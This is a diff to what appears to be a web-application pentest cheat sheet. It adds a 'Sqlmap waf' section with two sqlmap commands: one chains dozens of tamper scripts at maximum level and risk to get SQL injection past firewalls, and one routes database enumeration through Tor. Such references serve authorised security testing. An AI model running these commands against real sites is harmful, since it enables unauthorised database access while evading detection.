@@ -46,3 +46,8 @@ block request '-Pn'
 9. File Upload: Assess how the application handles file uploads, checking for potential vulnerabilities such as allowing the execution of malicious files or bypassing file type restrictions.
 
 10. Information Disclosure: Look for any instances of sensitive information disclosure, such as error messages, debug information, or server configuration details, which could aid attackers in their exploitation attempts.
+
+##Sqlmap waf
+
+1. sqlmap -u 'http://www.site.com:80/search.cmd?form_state=1’ --level=5 --risk=3 -p 'item1' --tamper=apostrophemask,apostrophenullencode,appendnullbyte,base64encode,between,bluecoat,chardoubleencode,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,randomcomments,securesphere,space2comment,space2dash,space2hash,space2morehash,space2mssqlblank,space2mssqlhash,space2mysqlblank,space2mysqldash,space2plus,space2randomblank,sp_password,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords
+2. sqlmap --tor --tor-type=SOCKS5 --check-tor --dbms=mysql -u "$URL" --dbs
